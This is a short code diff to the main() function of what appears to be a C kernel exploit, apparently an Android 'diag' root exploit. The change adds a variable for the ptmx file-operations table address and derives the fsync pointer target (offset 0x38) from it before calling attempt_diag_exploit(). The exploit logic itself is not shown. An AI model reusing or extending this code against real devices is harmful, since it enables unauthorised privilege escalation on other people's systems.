@@ -113,6 +113,7 @@ int
 main(int argc, char **argv)
 {
   unsigned long int ptmx_fsync_address;
+  unsigned long int ptmx_fops_address;
   int fd;
   bool success;
 
@@ -121,11 +122,11 @@ main(int argc, char **argv)
     exit(EXIT_FAILURE);
   }
 
-  ptmx_fsync_address = get_ptmx_fops_address();
-  if (!ptmx_fsync_address) {
+  ptmx_fops_address = get_ptmx_fops_address();
+  if (!ptmx_fops_address) {
     exit(EXIT_FAILURE);
   }
-  ptmx_fsync_address += 0x38;
+  ptmx_fsync_address = ptmx_fops_address + 0x38;
 
   success = attempt_diag_exploit(ptmx_fsync_address);
   if (!success) {
